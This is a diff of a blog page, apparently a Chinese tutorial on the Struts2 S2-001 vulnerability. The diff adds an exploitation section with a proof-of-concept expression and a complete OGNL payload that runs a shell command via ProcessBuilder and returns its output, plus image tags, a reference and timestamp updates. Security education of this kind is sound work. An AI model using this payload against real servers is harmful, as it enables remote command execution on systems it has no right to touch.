@@ -100,6 +100,8 @@
 <meta property="og:image" content="http://images.xianyu123.club/20200815123032.png">
 <meta property="og:image" content="http://images.xianyu123.club/20200815123256.png">
 <meta property="og:image" content="http://images.xianyu123.club/20200815123408.png">
+<meta property="og:image" content="http://images.xianyu123.club/20200819103900.png">
+<meta property="og:image" content="http://images.xianyu123.club/20200819105249.png">
 <meta property="og:image" content="http://images.xianyu123.club/20200817135247.png">
 <meta property="og:image" content="http://images.xianyu123.club/20200817140141.png">
 <meta property="og:image" content="http://images.xianyu123.club/20200817141102.png">
@@ -121,7 +123,7 @@
 <meta property="og:image" content="http://images.xianyu123.club/20200817160454.png">
 <meta property="og:image" content="http://images.xianyu123.club/20200818205338.png">
 <meta property="og:image" content="http://images.xianyu123.club/20200818205506.png">
-<meta property="og:updated_time" content="2020-08-18T12:55:26.149Z">
+<meta property="og:updated_time" content="2020-08-19T02:53:29.153Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="从零开始学习struts2漏洞———S2-001">
 <meta name="twitter:description" content="从零开始学习struts2漏洞———S2-001">
@@ -489,6 +491,13 @@
 <p><img src="http://images.xianyu123.club/20200815123256.png" alt="image-20200815123256613"></p>
 <p><strong>配置成功后启动如下图：</strong></p>
 <p><img src="http://images.xianyu123.club/20200815123408.png" alt="image-20200815123408534"></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><strong>poc验证：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;1+1&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="http://images.xianyu123.club/20200819103900.png" alt="image-20200819103900762"></p>
+<p><strong>命令执行：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;pwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+<p>将<code>new java.lang.String[]{&quot;whoami&quot;})</code>中的<code>whoami</code>替换为对应的命令，即可执行。</p>
+<p><img src="http://images.xianyu123.club/20200819105249.png" alt="image-20200819105249076"></p>
 <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在此之前，需要了解一些Struts2的工作原理的知识，方便我们后续代码审计</p>
 <ol>
 <li><a href="https://www.jianshu.com/p/ac89eaf1b6b5" target="_blank" rel="noopener">struts2处理http请求参数的流程</a></li>
@@ -547,6 +556,7 @@
 <h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
 <li><a href="https://xz.aliyun.com/t/2044" target="_blank" rel="noopener">【Struts2-命令-代码执行漏洞分析系列】S2-001</a></li>
 <li><a href="https://xz.aliyun.com/t/2672" target="_blank" rel="noopener">从零开始学习struts2漏洞 S2-001</a></li>
+<li><a href="[http://d1iv3.me/2018/02/01/S2-001%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/](http://d1iv3.me/2018/02/01/S2-001漏洞分析/">S2-001漏洞分析</a>)</li>
 </ul>
 
       
@@ -567,7 +577,7 @@
   <p><span>本文标题:</span><a href="/2020/08/15/从零开始学习struts2漏洞———S2-001/">从零开始学习struts2漏洞———S2-001</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 xianyu123 的个人博客">xianyu123</a></p>
   <p><span>发布时间:</span>2020年08月15日 - 09:58</p>
-  <p><span>最后更新:</span>2020年08月18日 - 20:55</p>
+  <p><span>最后更新:</span>2020年08月19日 - 10:53</p>
   <p><span>原始链接:</span><a href="/2020/08/15/从零开始学习struts2漏洞———S2-001/" title="从零开始学习struts2漏洞———S2-001">http://0clickjacking0.github.io/2020/08/15/从零开始学习struts2漏洞———S2-001/</a>
     <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://0clickjacking0.github.io/2020/08/15/从零开始学习struts2漏洞———S2-001/" aria-label="复制成功！"></i></span>
   </p>
@@ -824,7 +834,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞信息"><span class="nav-number">1.</span> <span class="nav-text">漏洞信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#环境搭建"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一步"><span class="nav-number">2.0.1.</span> <span class="nav-text">第一步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二步"><span class="nav-number">2.0.2.</span> <span class="nav-text">第二步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第三步"><span class="nav-number">2.0.3.</span> <span class="nav-text">第三步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第四步"><span class="nav-number">2.0.4.</span> <span class="nav-text">第四步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第五步"><span class="nav-number">2.0.5.</span> <span class="nav-text">第五步</span></a></li></ol></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#补丁分析"><span class="nav-number">4.</span> <span class="nav-text">补丁分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">5.</span> <span class="nav-text">Reference</span></a></li></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞信息"><span class="nav-number">1.</span> <span class="nav-text">漏洞信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#环境搭建"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一步"><span class="nav-number">2.0.1.</span> <span class="nav-text">第一步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二步"><span class="nav-number">2.0.2.</span> <span class="nav-text">第二步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第三步"><span class="nav-number">2.0.3.</span> <span class="nav-text">第三步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第四步"><span class="nav-number">2.0.4.</span> <span class="nav-text">第四步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第五步"><span class="nav-number">2.0.5.</span> <span class="nav-text">第五步</span></a></li></ol></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞分析"><span class="nav-number">4.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#补丁分析"><span class="nav-number">5.</span> <span class="nav-text">补丁分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">6.</span> <span class="nav-text">Reference</span></a></li></div>
             
 
           </div>
